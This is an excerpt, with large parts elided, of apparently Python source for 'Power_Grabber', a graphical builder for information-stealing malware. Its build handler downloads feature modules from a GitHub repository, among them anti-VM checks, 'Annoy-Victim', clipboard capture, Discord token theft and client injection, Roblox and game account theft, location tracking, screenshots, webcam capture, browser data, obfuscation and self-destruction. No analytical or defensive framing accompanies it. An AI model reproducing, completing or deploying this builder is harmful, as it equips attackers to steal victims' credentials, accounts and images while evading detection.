...
class Power_Grabber(ctk.CTk):
    def __init__(self):
        ...
        url = "https://raw.githubusercontent.com/stack-crash999/DARKWIRE-MAIN/refs/heads/main/Power%20Grabber.png"
        ur ="https://raw.githubusercontent.com/stack-crash999/DARKWIRE-MAIN/refs/heads/main/Power%20Grabber.png"
        u = "https://raw.githubusercontent.com/stack-crash999/DARKWIRE-MAIN/refs/heads/main/Power%20Grabber.png"
        URL = "https://raw.githubusercontent.com/stack-crash999/DARKWIRE-MAIN/refs/heads/main/settings.png"
    ...
    def create_options_page(self):
        ...
        def build_button_clicked(event):
            ...
            if 'Anti-VM' in enabled_features:
                vm_code = fetch_and_clean_code('https://raw.githubusercontent.com/stack-crash999/DARKWIRE-MAIN/refs/heads/main/vm-check.py')
            ...
            if 'Annoy-Victim' in enabled_features:
                annoy_code = fetch_and_clean_code('https://raw.githubusercontent.com/stack-crash999/DARKWIRE-MAIN/refs/heads/main/Annoy.py')
            ...
            if 'Clipboard' in enabled_features:
                clipboard_code = fetch_and_clean_code('https://raw.githubusercontent.com/stack-crash999/DARKWIRE-MAIN/refs/heads/main/Clipboard.py')
            ...
            if 'Discord-Info' in enabled_features:
                discord_code = fetch_and_clean_code('https://raw.githubusercontent.com/stack-crash999/DARKWIRE-MAIN/refs/heads/main/Discord-Info.py')
            ...
            if 'Discord-Injection' in enabled_features:
                discord_injection_code = fetch_and_clean_code('https://raw.githubusercontent.com/stack-crash999/DARKWIRE-MAIN/refs/heads/main/Injection.py')
            ...
            if 'Games-Info' in enabled_features:
                games_code = fetch_and_clean_code('https://raw.githubusercontent.com/stack-crash999/DARKWIRE-MAIN/refs/heads/main/Games.py')
            ...
            if 'Exact-location' in enabled_features:
                location_code = fetch_and_clean_code('https://raw.githubusercontent.com/stack-crash999/DARKWIRE-MAIN/refs/heads/main/Location.py')
            ...
            if 'Obfuscate' in enabled_features:
                obfuscate_code = fetch_and_clean_code('https://raw.githubusercontent.com/stack-crash999/DARKWIRE-MAIN/refs/heads/main/Obfuscate.py')
            ...
            if 'Roblox-Account' in enabled_features:
                roblox_code = fetch_and_clean_code('https://raw.githubusercontent.com/stack-crash999/DARKWIRE-MAIN/refs/heads/main/Roblox.py')
            ...
            if 'Screenshot' in enabled_features:
                screenshot_code = fetch_and_clean_code('https://raw.githubusercontent.com/stack-crash999/DARKWIRE-MAIN/refs/heads/main/Screenshot.py')
            ...
            if 'Self-destruction' in enabled_features:
                destruct_code = fetch_and_clean_code('https://raw.githubusercontent.com/stack-crash999/DARKWIRE-MAIN/refs/heads/main/Self-destruct.py')
            ...
            if 'Webcam' in enabled_features:
                webcam_code = fetch_and_clean_code('https://raw.githubusercontent.com/stack-crash999/DARKWIRE-MAIN/refs/heads/main/Webcam.py')
            ...
            if 'Browser-Info' in enabled_features:
                browser_code = fetch_and_clean_code('https://raw.githubusercontent.com/stack-crash999/DARKWIRE-MAIN/refs/heads/main/Browsers.py')
